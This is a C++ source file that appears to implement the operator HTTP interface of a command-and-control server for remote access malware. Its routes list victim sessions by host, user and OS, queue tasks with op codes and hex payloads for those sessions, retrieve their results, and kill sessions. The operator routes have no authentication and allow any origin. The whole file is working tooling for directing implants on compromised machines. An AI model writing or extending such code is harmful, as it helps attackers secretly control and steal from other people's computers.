#include "op_routes.h"
#include "session_router.h"
#include "shared/crypto.h"
#include "shared/proto.h"
#include "task_queue.h"


#include <cstdio>
#include <sstream>

extern server::SessionRouter g_router;
extern server::TaskQueue g_queue;

namespace server {

static std::string JsonEsc(const std::string &s) {
  std::string o;
  o.reserve(s.size() + 8);
  for (unsigned char c : s) {
    switch (c) {
    case '"':
      o += "\\\"";
      break;
    case '\\':
      o += "\\\\";
      break;
    case '\n':
      o += "\\n";
      break;
    case '\r':
      o += "\\r";
      break;
    case '\t':
      o += "\\t";
      break;
    default:
      if (c < 0x20) {
        char b[8];
        snprintf(b, sizeof(b), "\\u%04x", c);
        o += b;
      } else
        o.push_back(char(c));
    }
  }
  return o;
}

static std::string Extract(const std::string &src, const std::string &key) {
  std::string pat = "\"" + key + "\":\"";
  size_t p = src.find(pat);
  if (p == std::string::npos)
    return {};
  p += pat.size();
  std::string out;
  for (size_t i = p; i < src.size(); ++i) {
    if (src[i] == '\\' && i + 1 < src.size()) {
      char n = src[i + 1];
      out.push_back(n == 'n' ? '\n' : n == 'r' ? '\r' : n == 't' ? '\t' : n);
      ++i;
    } else if (src[i] == '"') {
      break;
    } else {
      out.push_back(src[i]);
    }
  }
  return out;
}

static long long ExtractNum(const std::string &src, const std::string &key) {
  std::string pat = "\"" + key + "\":";
  size_t p = src.find(pat);
  if (p == std::string::npos)
    return -1;
  p += pat.size();
  while (p < src.size() && (src[p] == ' ' || src[p] == '\t'))
    ++p;
  try {
    return std::stoll(src.substr(p));
  } catch (...) {
    return -1;
  }
}

static long long AgeSeconds(const Session &s, Clock::time_point now) {
  if (s.last_seen.time_since_epoch().count() == 0)
    return -1;
  return std::chrono::duration_cast<std::chrono::seconds>(now - s.last_seen)
      .count();
}

static void SetJson(http::Response &res, int status, const std::string &body) {
  res.status = status;
  res.headers.emplace_back("Content-Type", "application/json");
  res.headers.emplace_back("Cache-Control", "no-store");
  res.headers.emplace_back("Access-Control-Allow-Origin", "*");
  res.body.assign(body.begin(), body.end());
}

void HandleOpRoute(const http::Request &req, http::Response &res,
                   bool &handled) {
  std::string body(req.body.begin(), req.body.end());

  if (req.method == "OPTIONS") {
    handled = true;
    res.status = 204;
    res.headers.emplace_back("Access-Control-Allow-Origin", "*");
    res.headers.emplace_back("Access-Control-Allow-Methods",
                             "GET, POST, OPTIONS");
    res.headers.emplace_back("Access-Control-Allow-Headers", "Content-Type");
    return;
  }

  if (req.path == "/op/ping") {
    handled = true;
    SetJson(res, 200, "{\"ok\":true}");
    return;
  }

  if (req.path == "/op/sessions") {
    handled = true;
    auto now = Clock::now();
    std::string json = "[";
    auto list = g_router.List();
    for (size_t i = 0; i < list.size(); ++i) {
      auto &s = list[i];
      if (i)
        json += ",";
      json += "{\"id\":\"" + JsonEsc(s.session_id) +
              "\""
              ",\"host\":\"" +
              JsonEsc(s.hostname) +
              "\""
              ",\"user\":\"" +
              JsonEsc(s.username) +
              "\""
              ",\"os\":\"" +
              JsonEsc(s.os) +
              "\""
              ",\"alive\":" +
              (s.alive ? "true" : "false") +
              ",\"age\":" + std::to_string(AgeSeconds(s, now)) +
              ",\"pending\":" + std::to_string(g_queue.Pending(s.session_id)) +
              "}";
    }
    json += "]";
    SetJson(res, 200, json);
    return;
  }

  if (req.path == "/op/results") {
    handled = true;
    std::string sid = Extract(body, "sid");
    if (sid.empty()) {
      SetJson(res, 400, "{\"error\":\"sid\"}");
      return;
    }
    auto results = g_queue.TakeResults(sid);
    std::string json = "[";
    for (size_t i = 0; i < results.size(); ++i) {
      auto &r = results[i];
      if (i)
        json += ",";
      json += "{\"task_id\":" + std::to_string(r.id) +
              ",\"op\":" + std::to_string(int(r.op)) + ",\"data\":\"" +
              crypto::ToHex(r.payload) + "\"}";
    }
    json += "]";
    SetJson(res, 200, json);
    return;
  }

  if (req.path == "/op/task") {
    handled = true;
    std::string sid = Extract(body, "sid");
    std::string ph = Extract(body, "payload");
    long long opv = ExtractNum(body, "op");
    if (sid.empty() || opv < 0) {
      SetJson(res, 400, "{\"error\":\"sid/op\"}");
      return;
    }

    uint32_t id = g_router.AllocTaskId(sid);
    if (!id) {
      SetJson(res, 404, "{\"error\":\"unknown session\"}");
      return;
    }

    auto payload = crypto::FromHex(ph);
    g_queue.Enqueue(sid, id, proto::Op(opv), std::move(payload));
    SetJson(res, 200, "{\"ok\":true,\"task_id\":" + std::to_string(id) + "}");
    return;
  }

  if (req.path == "/op/kill") {
    handled = true;
    std::string sid = Extract(body, "sid");
    if (sid.empty()) {
      SetJson(res, 400, "{\"error\":\"sid\"}");
      return;
    }
    g_router.MarkDead(sid);
    g_queue.Drop(sid);
    SetJson(res, 200, "{\"ok\":true}");
    return;
  }

  handled = false;
}

}